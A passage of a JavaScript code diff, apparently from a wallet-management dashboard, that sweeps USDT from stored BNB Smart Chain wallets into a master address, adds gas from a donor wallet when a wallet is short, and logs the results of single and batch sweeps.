+            to: address,
+            value: ethers.parseEther('0.000025')
+          });
+          appendLog(`Fuel Tx broadcasted: ${fuelTx.hash.substring(0, 18)}... Awaiting confirmation...`, '#00e676');
+          await fuelTx.wait(1);
+          appendLog(`✅ Gas refueled successfully! Proceeding with USDT sweep...`, '#00e676');
+          donorWallet.bnb -= 0.00003;
+        } catch (fuelErr) {
+          appendLog(`❌ Auto-refuel failed: ${fuelErr.message}`, '#ff3d00');
+          if (btn) btn.disabled = false;
+          return;
+        }
+      } else {
+        appendLog(`⚠️ Insufficient BNB for gas fee (Has: ${bnbAmount.toFixed(6)} BNB, Needs: ~${MIN_SWEEP_GAS_BNB} BNB / ~$0.01).`, '#ffc107');
+        appendLog(`💡 Tip: Send a tiny amount of BNB (~$0.01 - $0.02) to ${address} or click '🔑 Key' to import into MetaMask and transfer with your connected wallet.`, '#ffc107');
+        if (btn) btn.disabled = false;
+        return;
+      }
+    }
+
+    try {
+      const signer = new ethers.Wallet(privateKey, provider);
+      const contract = new ethers.Contract(BSC_USDT_ADDR, usdtAbi, signer);
+
+      appendLog(`Reading exact on-chain balance...`);
+      const rawBalance = await contract.balanceOf(address);
+      if (rawBalance === 0n) {
+        appendLog(`❌ Balance is 0 on-chain. Nothing to sweep.`, '#ff3d00');
+        if (btn) btn.disabled = false;
+        return;
+      }
+
+      appendLog(`Broadcasting transaction on BSC...`, '#00e5ff');
+      const tx = await contract.transfer(masterAddr, rawBalance);
+      appendLog(`Tx Broadcasted! Hash: ${tx.hash}`, '#00e676');
+      appendLog(`Awaiting blockchain confirmation...`);
+
+      const receipt = await tx.wait(1);
+      appendLog(`✅ Transaction Confirmed in block ${receipt.blockNumber}!`, '#00e676');
+      appendLog(`🔗 <a href="https://bscscan.com/tx/${tx.hash}" target="_blank" style="color:#00e5ff; text-decoration:underline;">View on BscScan</a>`, '#00e5ff');
+
+      toast('USDT Swept to Master Wallet Successfully! 🚀', 'success');
+
+      // Refresh balance in local list
+      const targetInList = treasuryWallets.find(w => w.address.toLowerCase() === address.toLowerCase());
+      if (targetInList) targetInList.usdt = 0;
+      filterTreasuryTable();
+
+    } catch (err) {
+      console.error('Sweep execution error:', err);
+      appendLog(`❌ Transaction Failed: ${err.message}`, '#ff3d00');
+      toast('Sweep failed: ' + err.message, 'error');
+    } finally {
+      if (btn) {
+        btn.disabled = false;
+        btn.innerText = 'Done ✓';
+      }
+    }
+  } else if (currentSweepTarget.type === 'all') {
+    const { wallets, masterAddr } = currentSweepTarget;
+    appendLog(`Beginning batch sweep of ${wallets.length} wallets...`, '#00e5ff');
+
+    let successCount = 0;
+    let failedCount = 0;
+
+    for (let i = 0; i < wallets.length; i++) {
+      const w = wallets[i];
+      appendLog(`--- [${i + 1}/${wallets.length}] Sweeping ${w.address} ($${w.usdt.toFixed(2)}) ---`, '#fff');
+
+      if (w.bnb < MIN_SWEEP_GAS_BNB) {
+        appendLog(`⚠️ Skipped: Needs BNB gas fee (~${MIN_SWEEP_GAS_BNB} BNB / ~$0.01).`, '#ffc107');
+        failedCount++;
+        continue;
+      }
+
+      try {
+        const signer = new ethers.Wallet(w.privateKey, provider);
+        const contract = new ethers.Contract(BSC_USDT_ADDR, usdtAbi, signer);
+        const rawBal = await contract.balanceOf(w.address);
+
+        if (rawBal === 0n) {
+          appendLog(`Notice: On-chain balance is 0.`, '#94a3b8');
+          continue;
+        }
+
+        const tx = await contract.transfer(masterAddr, rawBal);
+        appendLog(`Tx Sent: ${tx.hash.substring(0, 18)}...`, '#00e676');
+        await tx.wait(1);
+        appendLog(`✓ Swept successfully!`, '#00e676');
+        w.usdt = 0;
+        successCount++;
+      } catch (err) {
+        appendLog(`❌ Failed: ${err.message}`, '#ff3d00');
+        failedCount++;
+      }
+    }
+
+    appendLog(`🎉 Batch Sweep Finished! Success: ${successCount}, Skipped/Failed: ${failedCount}`, '#00e676');
+    filterTreasuryTable();
+    toast(`Batch sweep complete! ${successCount} wallets swept.`, 'success');
+    if (btn) {
+      btn.disabled = false;
+      btn.innerText = 'Completed ✓';
+    }
+  }
+}
+
+window.loadTreasury = loadTreasury;
+window.saveTreasuryMasterAddress = saveTreasuryMasterAddress;
+window.scanAllTreasuryWallets = scanAllTreasuryWallets;
+window.filterTreasuryTable = filterTreasuryTable;
+window.initiateSingleSweep = initiateSingleSweep;
+window.confirmSweepAllWallets = confirmSweepAllWallets;
+window.executeSweepConfirmed = executeSweepConfirmed;
